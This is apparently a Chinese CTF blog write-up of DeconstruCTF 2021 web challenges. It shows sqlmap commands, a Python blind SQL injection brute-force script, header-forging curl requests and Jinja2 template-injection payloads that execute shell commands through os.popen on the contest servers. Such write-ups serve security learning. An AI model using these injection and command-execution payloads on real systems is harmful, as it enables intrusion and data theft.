<!doctype html><html lang=en-us>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<title>AmiaaaZ's Site | DeconstruCTF2021 Wp</title>
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=generator content="Hugo 0.89.4">
<meta name=ROBOTS content="INDEX, FOLLOW">
<link href=/dist/app.css rel=stylesheet>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
</head>
<body class="bg-gray-100 text-gray-700 font-sans">
<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
<div>
<h2>
<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
</h2>
</div>
<h1 class=pt-2>DeconstruCTF2021 Wp</h1>
<h3 class="text-java-700 font-normal leading-relaxed pt-2">水，就摁水，摁复现</h3>
<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-10-30T13:35:32+08:00>2021-10-30 13:35</time>
</div>
<details class=toc open>
<summary>
<hr>
</summary>
<div class="inline toc-content">
<nav id=TableOfContents>
<ul>
<li><a href=#webheres-a-flag>Web/Here&rsquo;s a Flag</a></li>
<li><a href=#webplease>Web/Please</a></li>
<li><a href=#webtaxi-union-problems>Web/Taxi Union Problems</a></li>
<li><a href=#webnever-gonna-lie-to-you>*Web/Never gonna lie to you</a></li>
<li><a href=#webcurly-fries-1>Web/Curly Fries 1</a></li>
<li><a href=#webthe-gate-keeper>Web/The Gate Keeper</a></li>
<li><a href=#webhungry-man>Web/Hungry Man</a></li>
<li><a href=#webcurly-fries-2>Web/Curly Fries 2</a></li>
<li><a href=#webcurly-fries-3>Web/Curly Fries 3</a></li>
<li><a href=#webmega-mailer>Web/Mega Mailer</a></li>
</ul>
</nav>
</div>
</details>
<hr>
</div>
</header>
<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
<article>
<section class="mx-auto content">
<div class=c-rich-text><p><a href=https://ctftime.org/event/1453/tasks/>https://ctftime.org/event/1453/tasks/</a></p>
<h2 id=webheres-a-flag>Web/Here&rsquo;s a Flag</h2>
<blockquote>
<p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png alt=image-20211003224148107></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png alt=image-20211003224209166></p>
<p><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ</a> 不用看了 Never Gonna Give You Up</p>
<p>看style.css flag: &ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}"; 但是不是最终的flag，解一下rot13 amount=23</p>
<p><code>dsc{we0come_to_deconstructf}</code></p>
<p>签到题也好折腾TAT</p>
<h2 id=webplease>Web/Please</h2>
<blockquote>
<p>Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company&rsquo;s servers. I know it&rsquo;s been a while, but could you <strong>please</strong> try to access those files? I would be very grateful!</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png alt=image-20211003225518532></p>
<p>熟练抓包，Cookie中有两个参数，Admin_Access和Username，改为True和Clancy</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png alt=image-20211003230430641></p>
<p>改浏览器标识头 <code>User-Agent: DeemBrowser</code></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png alt=image-20211003230638917></p>
<p>需要基础认证，但是这里的MagicWord稍微卡了一下</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png alt=image-20211003232421727></p>
<p>原因是我太铸币了忘了加Basic，<code>Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==</code></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png alt=image-20211004003846943></p>
<p>加一个日期的头，<code>Date: Thu, 1 Apr 2021 12:00:00 GMT</code></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png alt=image-20211004004026742></p>
<p>换成<code>Date: Mon, 5 Apr 2021 12:00:00 GMT</code></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png alt=image-20211004004153788></p>
<p><code>dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}</code></p>
<h2 id=webtaxi-union-problems>Web/Taxi Union Problems</h2>
<blockquote>
<p>An important package has been stolen from Mr Nagaraj by a Taxi driver. We&rsquo;ve tried to ask the local taxi union about driver&rsquo;s location but they are refusing provide the same.</p>
<p>Since this package is required for a time sensitive matter we don&rsquo;t have time to negotiate with the union.</p>
<p>Your task is to obtain the location of the taxi using the given information
<code>Taxi Lisence Plate: TN-06-AP-9879</code></p>
<p>HINT: The flag is the location of the taxi (no caps)</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png alt=image-20211003233419781></p>
<p>输入<code>TN-06-AP-9879'--%20</code>回显一样，有注入，把post的内容拿去让sqlmap跑一下</p>
<pre tabindex=0><code>python sqlmap.py -r &quot;/home/amelia/sh4r3/post.txt&quot; -p lisence_plate --tables
python sqlmap.py -r &quot;/home/amelia/sh4r3/post.txt&quot; -p lisence_plate -T taxi --columns
python sqlmap.py -r &quot;/home/amelia/sh4r3/post.txt&quot; -p lisence_plate -T taxi --dump
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png alt=image-20211004000253417></p>
<p>Ayanavaram</p>
<h2 id=webnever-gonna-lie-to-you>*Web/Never gonna lie to you</h2>
<blockquote>
<p>Trust me, take everything in the home page for face value. I would never lie to you.</p>
</blockquote>
<p>主页有一句<em>Not even search engines can find it.</em>，提示我们看/robots.txt</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png alt=image-20211004000643314></p>
<p>转到/never_gonna_give_you_up页面，标题是Admin Page但是一片空白，抓包后看到post表单的地方被抬头给挡住了，目标地址是/never_gonna_let_you_down</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png alt=image-20211004000944013></p>
<p>提交两个参数username和password，回显<em>YOU LIED TO ME !!!</em></p>
<p>————然后没然后了 我还没看完 环境就关了TAT</p>
<h2 id=webcurly-fries-1>Web/Curly Fries 1</h2>
<blockquote>
<p>Normal fries are nice, but everything&rsquo;s better with a curl in it. The flag is right in front of you.</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png alt=image-20211004170846442></p>
<p>emmmmm 没有任何提示</p>
<p>看wp以后发现这是真脑洞了，但也不能这么说，毕竟已经给出了Sweden很明显的提示，我们需要用指定的Swedish语言来访问这个网站</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -i http://very.uniquename.xyz:8880/ -H <span style=color:#d88200>&#34;Accept-Language: sv-SE&#34;</span>
</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png alt=image-20211004171513900></p>
<p><code>dsc{1_l0v3_sw3d3n}</code></p>
<h2 id=webthe-gate-keeper>Web/The Gate Keeper</h2>
<blockquote>
<p>That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.</p>
<p><strong>Note:</strong> This challenge might require a bruteforce approach.</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png alt=image-20211004171755317></p>
<p>还是sqli</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
<span style=color:#f92672>import</span> <span style=color:#111>string</span>

<span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span>

<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>flag</span><span style=color:#111>)</span>

<span style=color:#111>domain</span> <span style=color:#f92672>=</span> <span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>ascii_lowercase</span> <span style=color:#f92672>+</span> <span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>ascii_uppercase</span> <span style=color:#f92672>+</span> <span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>digits</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;_}&#39;</span>

<span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>

<span style=color:#111>challenge</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;gate keeper&#34;</span>
<span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span>
<span style=color:#111>check</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span>
<span style=color:#111>key</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span>
<span style=color:#111>column</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span>
<span style=color:#00a8c8>if</span> <span style=color:#111>challenge</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;taxi union&#34;</span><span style=color:#111>:</span>
    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;http://extremely.uniquename.xyz:2052/&#39;</span>
    <span style=color:#111>check</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;TN-06-AP-9879&#34;</span>
    <span style=color:#111>key</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;lisence_plate&#39;</span>
    <span style=color:#111>column</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;location&#34;</span>
<span style=color:#00a8c8>elif</span> <span style=color:#111>challenge</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;gate keeper&#39;</span><span style=color:#111>:</span>
    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;http://extremely.uniquename.xyz:2082/&#39;</span>
    <span style=color:#111>check</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;The flag for the CTF is the password you entered.(If you havent cheated that is)&#34;</span>
    <span style=color:#111>key</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;password&#39;</span>
    <span style=color:#111>column</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;password&#34;</span>

<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;URL&#34;</span><span style=color:#111>,</span> <span style=color:#111>url</span><span style=color:#111>)</span>

<span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
    <span style=color:#00a8c8>for</span> <span style=color:#111>char</span> <span style=color:#f92672>in</span> <span style=color:#111>domain</span><span style=color:#111>:</span>
        <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#39; or </span><span style=color:#d88200>{}</span><span style=color:#d88200> like &#39;</span><span style=color:#d88200>{}</span><span style=color:#d88200>%&#39;; --&#34;</span><span style=color:#f92672>.</span><span style=color:#111>format</span><span style=color:#111>(</span><span style=color:#111>column</span><span style=color:#111>,</span> <span style=color:#111>flag</span> <span style=color:#f92672>+</span> <span style=color:#111>char</span><span style=color:#111>)</span>
        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span>

        <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#111>key</span><span style=color:#111>:</span> <span style=color:#111>payload</span><span style=color:#111>})</span>

        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>check</span> <span style=color:#f92672>in</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>):</span>
            <span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#111>flag</span> <span style=color:#f92672>+</span> <span style=color:#111>char</span>
            <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Success &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>flag</span><span style=color:#111>)</span>

            <span style=color:#00a8c8>break</span>

</code></pre></div><h2 id=webhungry-man>Web/Hungry Man</h2>
<blockquote>
<p>There is nothing here I promise! ;)</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png alt=image-20211004172041299></p>
<p>抓包，cookie部分有一个b64，解码后</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png alt=image-20211004172123925></p>
<p>说实话，这个题做的时候没注意set-cookie的部分，<a href=https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man>参考wp</a></p>
<p>这里的依据set-cookie的值设置后，会不断的产生新的md5-hash的cookie值，写一个脚本不断地设置和应用新的cookie，将这些解密后拼起来就是flag了</p>
<p><code>dsc{91v3_m3_4_h4ndfu1_0f_c00k135}</code></p>
<h2 id=webcurly-fries-2>Web/Curly Fries 2</h2>
<blockquote>
<p>Normal fries are nice, but everything&rsquo;s better with a curl in it. Why do logos make things so recognizable?</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png alt=image-20211004172502484></p>
<p>无提示，<a href=https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202>参考wp</a></p>
<p>有点脑洞了，把User-Agent的地方设置为xbox和Linux之后，图片会消失并露出flag</p>
<p><code>dsc{1m4g1n3_l1nux_0n_4n_xb0x}</code></p>
<h2 id=webcurly-fries-3>Web/Curly Fries 3</h2>
<blockquote>
<p>Normal fries are nice, but everything&rsquo;s better with a curl in it. I&rsquo;m with you, every step of the way.</p>
</blockquote>
<p>直接访问提示405，post一下回显<em>perhaps try Googling me instead?</em></p>
<p>访问/robots.txt，404</p>
<p>用wappalyzer可以看到这是一个flask应用</p>
<p><a href=https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203>参考wp</a></p>
<p>看到第一个提示之后不够敏感，我们可以设置来源refer是google.com</p>
<pre tabindex=0><code>curl -i -X POST -H &quot;Referer: https://www.google.com&quot; http://overly.uniquename.xyz:2095/
</code></pre><p>回显中提示我们再设置Host</p>
<pre tabindex=0><code>curl -i -X POST -H &quot;Referer: https://www.google.com&quot; -H&quot;Host:https://dscvit.com&quot; http://overly.uniquename.xyz:2095/
</code></pre><p>回显<em>potates and carrots are my friends, milk and Cookies will be my end</em>，不是很明显，但是应该设置cookie=root</p>
<p>之后回显<em>JFATHER, JMOTHER, JDAUGHTER, ____?</em>，提示把content-type改为json</p>
<p>回显*{&lsquo;error&rsquo;: &lsquo;json data missing&rsquo;}*，添加一点data</p>
<pre tabindex=0><code>curl -i -X POST -H &quot;Referer: https://www.google.com&quot; -H &quot;Host: https://www.dscvit.com&quot; -H &quot;Content-Type: application/json&quot; --cookie &quot;user=root&quot; -d '{&quot;foo&quot;:&quot;bar&quot;}' http://overly.uniquename.xyz:2095/
</code></pre><p>回显*{&lsquo;error&rsquo;: {&lsquo;messi&rsquo;: &lsquo;required&rsquo;}}<em>，将foo改为bar，回显</em>{&lsquo;error&rsquo;: {&lsquo;messi&rsquo;: &lsquo;which club am i at?'}}*</p>
<p>*不太懂为啥这就能知道把bar赋值为PSG？？？</p>
<pre tabindex=0><code>curl -i -X POST -H &quot;Referer: https://www.google.com&quot; -H &quot;Host: https://www.dscvit.com&quot; -H &quot;Content-Type: application/json&quot; --cookie &quot;user=root&quot; -d '{&quot;messi&quot;:&quot;psg&quot;}' http://overly.uniquename.xyz:2095/
</code></pre><p>得到flag <code>dsc{th15_15_w4y_t00_much_w0rk}</code></p>
<h2 id=webmega-mailer>Web/Mega Mailer</h2>
<blockquote>
<p>We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png alt=image-20211004005500420></p>
<p>讲真，之前没接触过</p>
<p>首先在自己的vps上开一个smtp的服务，用python开</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
</code></pre></div><p>然后其它信息正常填，body部分存在ssti注入，payload来自于<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>PayloadsAllTheThings</a></p>
<pre tabindex=0><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png alt=image-20211004181339121></p>
<p><code>dsc{819_8r41n_m41L3R}</code></p>
<p>参考：<a href=https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md>wp</a></p>
<hr>
<p>说实话，这一篇wp早就水完了，但是中间那个Never gonna lie to you的题因为没有地方复现也没搜着别的wp就一直拖着，拖到现在，还是没找到，放弃了，可惜死了，这个故事告诉我们做题复现要趁早</p>
</div>
</section>
</article>
</main>
<div class="w-full h-0 flex-none order-3"></div>
<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
<div class="md:max-w-xs flex flex-col md:items-end">
<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
<li class="px-1 md:px-0">
<a href=/posts/ title="Posts page">
Posts
</a>
</li>
<li class="px-1 md:px-0">
<a href=/relax/ title="Relaxxx page">
Relaxxx
</a>
</li>
<li class="px-1 md:px-0">
<a href=/categories/ title="Categories page">
Categories
</a>
</li>
<li class="px-1 md:px-0">
<a href=/tags/ title="Tags page">
Tags
</a>
</li>
<li class="px-1 md:px-0">
<a href=/series/ title="Series page">
Series
</a>
</li>
<li class="px-1 md:px-0">
<a href=/about/ title="About page">
About
</a>
</li>
<li class="px-1 md:px-0">
<a href=/friends/ title="Friends page">
Friends
</a>
</li>
<div id=fastSearch class=m-0>
<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
</ul>
</div>
</ul>
<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
</div>
</a>
<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
</div>
</a>
<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
</div>
</a>
<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
</div>
</a>
<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
